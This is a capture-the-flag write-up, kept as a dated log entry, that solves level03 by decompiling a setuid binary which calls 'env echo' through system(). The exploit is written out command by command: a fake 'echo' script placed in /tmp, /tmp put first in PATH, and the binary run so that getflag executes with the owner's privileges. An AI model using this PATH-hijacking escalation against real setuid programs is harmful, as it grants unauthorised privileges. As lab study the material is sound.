Date: 9/10/2024

Entry:

Today's task was to analyze the file `./level03`.

After examining the file permissions `-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03`, we noted the presence of the `suid` and `sgid` (it allowed us to execute program as owner user).

Using `scp`, we opened the program in `Ghidra` and started analyzing the binary.

We successfully recovered the `main()` function:
```
void main(void)
{
  __gid_t __rgid;
  __uid_t __ruid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  system("/usr/bin/env echo Exploit me");
  return;
}
```

We attempted to modify the variable values using `gdb`, which was available on the virtual machine.
However, our efforts were fruitless because `gdb` was running with our user’s privileges, so despite several hours of attempts, we did not achieve results.

We then tried to replace the `echo` command with our custom script that contained `getflag`. This was the correct approach, as after executing the program, we successfully retrieved our flag.

Commands used:
`echo -e '#!/bin/sh\n/bin/getflag' > /tmp/custom_program.sh`
`chmod +x /tmp/custom_program.sh`
`export PATH=/tmp:$PATH`
`echo $PATH`
`which custom_program.sh`
`mv /tmp/custom_program.sh /tmp/echo`
`env echo "Test"` -> `Check flag.Here is your token :Nope there is no token here for you sorry. Try again :)`
`./level03`

Once again, the solution was right under our noses. :)